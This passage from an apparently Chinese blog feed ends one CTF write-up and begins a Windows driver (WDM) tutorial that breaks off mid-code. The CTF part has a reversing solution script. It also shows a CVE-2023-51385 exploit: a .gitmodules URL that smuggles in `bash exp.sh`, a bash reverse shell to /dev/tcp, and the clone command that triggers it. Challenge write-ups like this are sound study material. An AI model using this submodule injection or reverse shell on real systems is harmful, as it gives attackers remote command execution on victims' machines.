class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  std::ostream *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">44</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">42</span>]; <span class="comment">// [rsp+D0h] [rbp+50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+104h] [rbp+84h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> Seed; <span class="comment">// [rsp+108h] [rbp+88h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10Ch] [rbp+8Ch]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  Seed = <span class="built_in">time</span>(<span class="number">0</span>i64);</span><br><span class="line">  <span class="built_in">srand</span>(Seed);</span><br><span class="line">  std::string::<span class="built_in">string</span>((std::string *)input);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;((std::ostream *)&amp;std::cout, Str);</span><br><span class="line">  std::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="type">char</span>&gt;((std::istream *)&amp;std::cin, (std::string *)input);</span><br><span class="line">  std::string::<span class="built_in">string</span>((std::string *)&amp;input[<span class="number">32</span>], (<span class="type">const</span> std::string *)input);</span><br><span class="line">  <span class="built_in">change</span>((std::string *)&amp;input[<span class="number">16</span>], (std::string *)&amp;input[<span class="number">32</span>]);<span class="comment">// </span></span><br><span class="line">  std::string::<span class="keyword">operator</span>=(input, &amp;input[<span class="number">16</span>]);</span><br><span class="line">  std::string::~<span class="built_in">string</span>((std::string *)&amp;input[<span class="number">16</span>]);</span><br><span class="line">  std::string::~<span class="built_in">string</span>((std::string *)&amp;input[<span class="number">32</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( std::string::<span class="built_in">length</span>((std::string *)input) != <span class="number">42</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (std::ostream *)std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;((std::ostream *)&amp;std::cout, <span class="string">&quot;len error&quot;</span>);</span><br><span class="line">    std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;(v3);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(v6, &amp;unk_46A020, <span class="number">0xA8</span>ui64);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">41</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">rand</span>() % <span class="number">255</span>;</span><br><span class="line">    v4 = (<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[](input, i);</span><br><span class="line">    <span class="keyword">if</span> ( (v8 ^ *v4) != v6[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  std::string::~<span class="built_in">string</span>((std::string *)input);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong> <code>f&#123;</code></strong>change mapping</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">t1 = <span class="built_in">list</span>(<span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890ABCDEF&quot;</span>)</span><br><span class="line">r1 = <span class="built_in">list</span>(<span class="string">&quot;aeimquy37AEbdfhjlnprtvxz24680BDFcgkosw159C&quot;</span>)</span><br><span class="line"></span><br><span class="line">t2 = <span class="string">&quot;flag&#123;abcdefghijklmnopqrstuvwxyz1234567890&#125;&quot;</span></span><br><span class="line">r2 = <span class="string">&quot;f&#123;dhlptx260lgacegikmoqsuwy13579&#125;abfjnrvz48&quot;</span></span><br><span class="line"></span><br><span class="line">mapping = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c in <span class="built_in">enumerate</span>(t1):</span><br><span class="line">    <span class="keyword">for</span> j, v in <span class="built_in">enumerate</span>(r1):</span><br><span class="line">        <span class="keyword">if</span> c == v:</span><br><span class="line">            mapping[i] = j</span><br><span class="line"><span class="built_in">print</span>(mapping)</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    assert t2[i] == r2[mapping[i]]</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">list</span>(<span class="string">&quot;f&#123;52bgb-281lg00ff-46f7-ca009c8e&#125;a381-b7191&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">42</span>)</span>:</span></span><br><span class="line"><span class="function">    print(flag[mapping[i]], end=</span><span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="modules"><a href="#modules" class="headerlink" title="modules"></a>modules</h2><p>CVE-2023-51385<del>gitee </del></p><p></p><ul><li><a href="https://blog.csdn.net/mirocky/article/details/135485164">CVE-2023-51385 OpenSSH ProxyCommand</a></li><li><a href="https://vin01.github.io/piptagole/ssh/security/openssh/libssh/remote-code-execution/2023/12/20/openssh-proxycommand-libssh-rce.html">SSH ProxyCommand  (CVE-2023-51385</a></li></ul><p> <code>gitee</code>  <code>.gitmodules</code> shell <code>.config</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[submodule &quot;cves&quot;]</span><br><span class="line">  path = cves</span><br><span class="line">  url = ssh://`bash exp.sh`foo.ichunqiu.com/bar</span><br></pre></td></tr></table></figure><p> <code>exp.sh</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>clone </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> &lt;repo&gt; --recurse-submodules</span><br></pre></td></tr></table></figure><p> curl <code>VPS </code></p><ul><li>curlvps 4444  9999 </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ufw allow port</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WDM</title>
      <link href="/2024/01/27/WDM/"/>
      <url>/2024/01/27/WDM/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Window Driver Module</p></blockquote><span id="more"></span><h2 id="WDK"><a href="#WDK" class="headerlink" title="WDK"></a>WDK</h2><p>VSsdkwdk</p><ul><li><a href="https://blog.csdn.net/qq_44240304/article/details/127549383">window10+vs2022window</a></li><li><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/download-the-wdk"> Windows  (WDK) - Windows drivers</a></li></ul><p> <code>VSIX Installer</code>VS</p><p> <code>Driver</code> </p><p>Windows <a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/">Windows VM</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>windowsNTWDM</p><p> <code>WDM(Windows Driver Model)</code>  <code>DriverEntry</code>   <code>DriverOnload</code> C++ </p><p>Driver Setting</p><ul><li>target OS VS2022 + win11 win7</li><li>target paltform:<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/develop/target-platforms"></a></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span> </span>&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Unload Module Demo\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RigisterEntry)</span> </span>&#123;</span><br><span class="line">DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Load Module Demo\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> helloworld <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/writing-your-first-driver"> </a></p><ul><li>KMDFWDMWindows Driver ModelKMDF</li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>OSRDriverLoader: <a href="https://www.osronline.com/article.cfm%5earticle=157.htm">Downloads:Driver Loader (osronline.com)</a></p><ul><li>w2k: windows 2000</li><li>WLH: windows vista</li><li>WNET: windows 7  <code>AMD64 OSRLOADER</code></li><li>WXP: windows XP</li></ul><h3 id="DEbug"><a href="#DEbug" class="headerlink" title="DEbug"></a>DEbug</h3><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/debugview">DebugView - Sysinternals</a>:  DbgPrint log</p><p>WinDbg: ,<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/debug-universal-drivers---step-by-step-lab--echo-kernel-mode-"> Windows  - Windows drivers</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">ed nt!Kd_DEFAULT_MASK 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">ed nt!Kd_Default_Mask 8</span><br></pre></td></tr></table></figure><h3 id="R0--R3-"><a href="#R0--R3-" class="headerlink" title="R0  R3 "></a>R0  R3 </h3><p>IOIO</p><h4 id="R0"><a href="#R0" class="headerlink" title="R0"></a>R0</h4><p>IoCreateDevice IoCreateDeviceSecure </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PDRIVER_OBJECT  DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG           DeviceExtensionSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PUNICODE_STRING DeviceName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DEVICE_TYPE     DeviceType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG           DeviceCharacteristics,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOLEAN         Exclusive,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PDEVICE_OBJECT  *DeviceObject</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateSymbolicLink</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PUNICODE_STRING SymbolicLinkName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PUNICODE_STRING DeviceName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// MS-DOS </span></span><br><span class="line">UNICODE_STRING DeviceName;</span><br><span class="line">UNICODE_STRING DosDeviceName;</span><br><span class="line">NTSTATUS status;</span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, <span class="string">L&quot;\\Device\\DeviceName&quot;</span>);</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DosDeviceName, <span class="string">L&quot;\\DosDevices\\DosDeviceName&quot;</span>);</span><br><span class="line">status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;DosDeviceName, &amp;DeviceName);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">  <span class="comment">/* Symbolic link creation failed.  Handle error appropriately. */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NT GUID KMDF </span></span><br></pre></td></tr></table></figure><p> <code>MajorFunction[IDX](IDX </code> IRP (I&#x2F;O Request Packet)<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object">DRIVER_OBJECT (wdm.h) - Windows drivers </a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_Use_decl_annotations_</span></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">  <span class="title">DispatchXxx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> _DEVICE_OBJECT  *DeviceObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> _IRP  *Irp</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="comment">// Function body</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoDeleteSymbolicLink</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PUNICODE_STRING SymbolicLinkName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">IoDeleteDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PDEVICE_OBJECT DeviceObject</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>IO</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DRIVER_NAME <span class="string">L&quot;\\Device\\Demo&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LINK_NAME <span class="string">L&quot;\\DosDevices\\Demo&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">IOCTL </span></span><br><span class="line"><span class="comment">I/O  32 </span></span><br><span class="line"><span class="comment">#define IOCTL_Device_Function CTL_CODE(DeviceType, Function, Method, Access)</span></span><br><span class="line"><span class="comment">DeviceType:  DEVICE_OBJECT DeviceType </span></span><br><span class="line"><span class="comment">FunctionCode   0x800  Microsoft   0x800 </span></span><br><span class="line"><span class="comment">#define CTL_CODE(DeviceType, Function, Method, Access) (</span></span><br><span class="line"><span class="comment">(DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method)</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTRL_BASE 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MYIOCTRL_CODE(i)\</span></span><br><span class="line"><span class="meta">CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTRL_BASE + i, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CTL_HELLO MYIOCTRL_CODE( 0 )</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriverObject)</span> </span>&#123;</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;Unload Driver\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  pIrp-&gt;IoStatus.Status IO</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DispatchCommon</span><span class="params">(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">pIrp-&gt;IoStatus.Status = STATUS_SUCCESS; <span class="comment">// IRP</span></span><br><span class="line">pIrp-&gt;IoStatus.Information = <span class="number">0</span>;         <span class="comment">// Information.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//.</span></span><br><span class="line"><span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line"><span class="built_in">KdPrintEx</span>((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;DispatchCommon\r\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;                  <span class="comment">//  STATUS_SUCCESSR3.IO</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DispatchRead</span><span class="params">(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PVOID pReadBuffer = <span class="literal">NULL</span>;</span><br><span class="line">ULONG uReadLength = <span class="number">0</span>;</span><br><span class="line">PIO_STACK_LOCATION pStack = <span class="literal">NULL</span>;</span><br><span class="line">ULONG uMin = <span class="number">0</span>;</span><br><span class="line">ULONG uHelloStr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">uHelloStr = (<span class="built_in">wcslen</span>(<span class="string">L&quot;Hello World&quot;</span>) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(WCHAR);</span><br><span class="line">pReadBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer; <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//IRP.30.IRP.windows.IRP..</span></span><br><span class="line">pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">uReadLength = pStack-&gt;Parameters.Read.Length;</span><br><span class="line">uMin = uReadLength &gt; uHelloStr ? uHelloStr : uReadLength;</span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(pReadBuffer, <span class="string">L&quot;Hello World&quot;</span>, uMin); <span class="comment">//3.</span></span><br><span class="line"></span><br><span class="line">pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">pIrp-&gt;IoStatus.Information = uMin;</span><br><span class="line"></span><br><span class="line"><span class="comment">//.</span></span><br><span class="line"><span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DispatchWrite</span><span class="params">(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PVOID pWriteBuffer = <span class="literal">NULL</span>;</span><br><span class="line">ULONG uWriteLength = <span class="number">0</span>;</span><br><span class="line">PIO_STACK_LOCATION pIrpStack = <span class="literal">NULL</span>;</span><br><span class="line">PVOID pBuffer = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//IRP</span></span><br><span class="line">pIrpStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line"></span><br><span class="line"><span class="comment">//.</span></span><br><span class="line">uWriteLength = pIrpStack-&gt;Parameters.Write.Length;</span><br><span class="line">pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">pWriteBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line"><span class="comment">//.</span></span><br><span class="line">pBuffer = <span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, uWriteLength, <span class="string">&#x27;DEMO&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == pBuffer)</span><br><span class="line">&#123;</span><br><span class="line">pIrp-&gt;IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line"><span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlZeroMemory</span>(pBuffer, uWriteLength);</span><br><span class="line"><span class="comment">//0</span></span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(pBuffer, pWriteBuffer, uWriteLength);</span><br><span class="line"><span class="built_in">KdPrintEx</span>((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;Write %s\r\n&quot;</span>, (PCHAR)pBuffer));</span><br><span class="line"><span class="built_in">ExFreePool</span>(pBuffer);</span><br><span class="line">pBuffer = <span class="literal">NULL</span>;</span><br><span class="line">pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">pIrp-&gt;IoStatus.Information = uWriteLength;</span><br><span class="line"><span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DispatchControl</span><span class="params">(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// SystemBuffer ..</span></span><br><span class="line">PIO_STACK_LOCATION pIrpStack;</span><br><span class="line">PVOID InPutBuffer = <span class="literal">NULL</span>;</span><br><span class="line">PVOID OutPutBuffer = <span class="literal">NULL</span>;</span><br><span class="line">ULONG uInPutLength = <span class="number">0</span>;</span><br><span class="line">ULONG uOutPutBufferLength = <span class="number">0</span>;</span><br><span class="line">ULONG IoCtrl = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">InPutBuffer = OutPutBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">pIrpStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line"></span><br><span class="line">IoCtrl = pIrpStack-&gt;Parameters.DeviceIoControl.IoControlCode;  <span class="comment">//.</span></span><br><span 